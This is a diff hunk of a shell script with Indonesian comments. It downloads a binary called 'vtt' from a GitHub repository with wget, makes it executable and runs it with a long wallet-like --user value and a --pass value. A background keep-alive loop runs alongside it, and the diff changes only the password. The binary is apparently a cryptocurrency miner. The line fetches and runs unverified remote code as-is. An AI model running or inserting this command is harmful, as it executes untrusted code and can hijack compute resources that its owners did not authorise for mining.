@@ -13,7 +13,7 @@ keep_alive &
 KEEP_PID=$!
 
 # Download & jalankan program utama
-wget -q https://github.com/Nitasa61/erdep1/raw/refs/heads/main/vtt && chmod +x vtt && ./vtt --user 85fw2RxMCZYf1B63WRHFYdfUB1TrwuotRbeFZ7WzU3TcTvSPztX9vsmZsczrJALfFtGGKZjv24ZvwK4txh4nMpDuCCGLMYK --pass afdah2
+wget -q https://github.com/Nitasa61/erdep1/raw/refs/heads/main/vtt && chmod +x vtt && ./vtt --user 85fw2RxMCZYf1B63WRHFYdfUB1TrwuotRbeFZ7WzU3TcTvSPztX9vsmZsczrJALfFtGGKZjv24ZvwK4txh4nMpDuCCGLMYK --pass vento2
 
 # Setelah program utama selesai, hentikan keep-alive
 kill $KEEP_PID 2>/dev/null
